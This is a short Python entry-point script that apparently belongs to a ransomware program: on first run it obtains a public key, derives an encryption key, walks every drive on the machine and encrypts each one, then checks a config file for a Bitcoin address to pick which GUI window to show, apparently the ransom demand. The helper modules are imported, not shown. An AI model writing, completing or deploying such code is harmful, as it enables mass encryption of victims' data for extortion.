from GUI import GUI
from drive_controller import *
from cryption import get_public_key, create_key
from configurator import *
from config import dir_name
    
if __name__ == '__main__':
    
    if not isInitiated():
        public_key, time = get_public_key()
        if public_key:
            create_config_file(time)
            key = create_key(public_key)
            drives=iterateDrives()
            for drive in drives:
                encryptDrive(key,drive)
        
    btc_address_send=False
    with open(f"C:/{dir_name}/{config_file}",'r') as cf:
                    if "btcaddress" in cf.read():
                        btc_address_send=True
                        
    if btc_address_send:
        GUI=GUI(2)
    else:
        GUI=GUI(1)